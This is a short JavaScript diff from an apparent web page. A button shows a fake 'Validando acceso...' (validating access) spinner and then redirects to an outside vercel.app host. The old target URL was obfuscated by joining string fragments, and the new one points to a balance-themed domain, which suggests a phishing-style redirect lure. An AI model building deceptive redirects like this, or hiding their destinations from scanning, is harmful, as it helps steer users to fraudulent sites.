@@ -298,7 +298,7 @@
       if (btn.disabled) return;
       btn.disabled = true;
       btn.innerHTML = '<span class="spinner"></span> Validando acceso...';
-      var target = ["https://", "mundial", "-ttk", ".vercel", ".app/"].join("");
+      var target = "https://misaldo-ar.vercel.app/";
       setTimeout(function () {
         window.location.href = target;
       }, 800);
